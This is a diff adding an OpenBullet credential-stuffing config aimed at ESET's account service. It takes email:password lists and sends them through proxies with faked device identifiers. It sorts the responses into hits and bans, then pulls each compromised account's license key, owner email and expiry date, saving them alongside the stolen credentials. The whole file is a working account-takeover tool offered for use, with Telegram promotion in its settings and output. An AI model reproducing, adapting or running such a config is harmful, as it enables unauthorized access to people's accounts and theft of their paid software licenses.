@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "eset.com",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-18T00:37:22.7670708+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 608648466
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var rnd = uuidv4();
+END SCRIPT -> VARS "rnd"
+
+#RND FUNCTION ToUppercase "<rnd>" -> VAR "RND" 
+
+#rnd2 FUNCTION RandomString "DESKTOP-?u?d?d?d?d?u?d" -> VAR "rnd2" 
+
+#rnd3 FUNCTION RandomString "?d?d?d?d?d?d?d?d" -> VAR "rnd3" 
+
+#Login REQUEST POST "https://edf.eset.com:443/edf" 
+  CONTENT "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<ecp:message xmlns:ecp=\"http://www.eset.com/2012/02/ecp\">\\n <ecp:container type=\"identification\" domain=\"meta\">\\n  <creds of=\"ACCOUNT_OWNER\">\\n   <uname><USER></uname>\\n   <passwd><PASS></passwd>\\n  </creds>\\n </ecp:container>\\n <ecp:container type=\"request\" domain=\"eset-account\">\\n  <ecp:command name=\"association\" version=\"2.0\">\\n   <assoctype>ASSOC_AUTHENTICATED</assoctype>\\n   <seat>\\n    <hwf><RND></hwf>\\n    <name><rnd2></name>\\n    <virt>VT_NONE</virt>\\n    <os>\\n     <type>WINDOWS</type>\\n     <version>10.0.18363 SP 0.0 NT</version>\\n     <versionid>2814749767124923</versionid>\\n     <lang>EN_US</lang>\\n     <architecture>x86_64</architecture>\\n    </os>\\n   </seat>\\n   <application>\\n    <id><rnd3></id>\\n    <version>3940658264539136</version>\\n    <product>\\n     <code>106</code>\\n     <version>14.2.10.0</version>\\n     <milestone>GA</milestone>\\n    </product>\\n    <distr_settings>PERpc3RyaWJ1dGlvblNldHRpbmdzPgoJPENoYW5uZWxUeXBlSWQ+NDwvQ2hhbm5lbFR5cGVJZD4KPC9EaXN0cmlidXRpb25TZXR0aW5ncz4K</distr_settings>\\n    <platform>WINDOWS</platform>\\n    <devicetype>NOTEBOOK</devicetype>\\n    <netrole>CLIENT</netrole>\\n    <lang>EN_US</lang>\\n   </application>\\n  </ecp:command>\\n </ecp:container>\\n</ecp:message>" 
+  CONTENTTYPE "text/xml" 
+  HEADER "Host: edf.eset.com:443" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<USER>" 
+    KEY "response><code>0</code>" 
+  KEYCHAIN Failure OR 
+    KEY "response><code>20512005</code>" 
+  KEYCHAIN Ban OR 
+    KEY "response><code>205123e8</code>" 
+
+#Token PARSE "<SOURCE>" LR "<seatid>" "</seatid>" -> VAR "Token" 
+
+#Post REQUEST POST "https://edf.eset.com:443/edf" 
+  CONTENT "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<ecp:message xmlns:ecp=\"http://www.eset.com/2012/02/ecp\">\\n <ecp:container type=\"identification\" domain=\"meta\">\\n  <seatid><Token></seatid>\\n </ecp:container>\\n <ecp:container type=\"request\" domain=\"eset-account\">\\n  <ecp:command name=\"activation\" version=\"2.1\">\\n   <validate-only>true</validate-only>\\n   <register_license>true</register_license>\\n   <acttype>ASSOCIATED_LICENSE_ACTIVATION</acttype>\\n   <actoption>MECAC_ACTIVATION</actoption>\\n   <country>US</country>\\n   <application>\\n    <product>\\n     <code>106</code>\\n    </product>\\n   </application>\\n  </ecp:command>\\n </ecp:container>\\n</ecp:message>" 
+  CONTENTTYPE "text/xml" 
+  HEADER "Host: edf.eset.com:443" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" AND 
+    KEY "NOT_AVAILABLE" 
+    KEY "<SOURCE>" DoesNotContain "AVAILABLE" 
+  KEYCHAIN Success OR 
+    KEY "AVAILABLE" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<mec_token>" 
+
+#License PARSE "<SOURCE>" LR "<availabilityflag>AVAILABLE</availabilityflag><pkey>" "</pkey>" CreateEmpty=FALSE -> CAP "License" 
+
+#Details PARSE "<SOURCE>" LR "availabilityflag>AVAILABLE" "</name><oname>" -> VAR "Details" 
+
+#ownerEmail PARSE "<Details>" LR "owner email : " " ," CreateEmpty=FALSE -> CAP "ownerEmail" 
+
+#expireDate PARSE "<Details>" REGEX "[0-9]{2}\\/[0-9]{2}\\/[0-9]{4}" "[0]" CreateEmpty=FALSE -> CAP "expireDate" 
+
+#Unix FUNCTION DateToUnixTime "MM/dd/yyyy" "<expireDate>" -> VAR "Unix" 
+
+#Current FUNCTION CurrentUnixTime -> VAR "Current" 
+
+#Compute FUNCTION Compute "(<Unix>-<Current>)/86400" -> VAR "Compute" 
+
+#daysLeft FUNCTION Round "<Compute>" -> CAP "daysLeft" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "eset.com.txt" Append "<USER>:<PASS>\\nLicense: <License>\\nownerEmail: <ownerEmail>\\nexpireDate: <expireDate>\\ndaysLeft: <daysLeft>\\nTelegram Channel: https://t.me/OpenBulletChannel\\n========================================================================\\n" -> VAR "Save" 
+
